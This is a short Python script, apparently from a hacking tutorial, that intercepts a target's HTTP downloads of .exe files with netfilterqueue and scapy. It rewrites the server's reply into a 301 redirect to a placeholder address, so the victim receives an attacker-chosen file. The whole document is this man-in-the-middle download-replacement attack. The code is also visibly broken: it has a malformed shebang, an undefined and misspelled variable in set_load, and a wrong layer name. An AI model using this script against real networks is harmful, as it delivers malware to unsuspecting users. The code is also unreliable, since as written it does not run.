#!usr/bin/env python

# Here we are intercepting the downloads that are made by the target client and replacing it with new file.

import netfilterqueue
import scapy.all as scapy

ack_list=[]  

def set_load(packet,load):

    packet[scapy.Raw].load=load
    del scapy_packet[scapy.Ip].len
    del scapy_packet[scapy.Ip].chksum
    del scapy_packey[scapy.TCP].chksum
    
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())   #converting into scapy packet
    if scapy_packet.haslayer(scapy.Raw):   #checking for HTTP layer

       if scapy_packet[scapy.TCP].dport == 80:  #HTTP requests
          
          if ".exe" in scapy_packet[scapy.Raw].load:
             print("[+]exe Request")
             ack_list.append(scapy_packet[scapy.TCP].ack)          
             print("scapy_packet.show()")

       elif scapy_packet[scapy.TCP].sport == 80:   #HTTP responses
            if scapy_packet[scapy.TCP].seq in ack_list:
               ack_list.remove(scapy_packet[scapy.TCP].seq)
               print("[+]Replacing File")
               modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation:<where you want to redirect>\n\n")   #changing status code to 301 to redirect the responses.
               
               packet.set_payload(str(modified_packet))

    packet.accept()  #to forward the packets

queue = netfilterqueue.NetfilterQueue()  #creating an instance of queue
queue.bind(0,process_packet)  #binding the queue and call back function
queue.run()
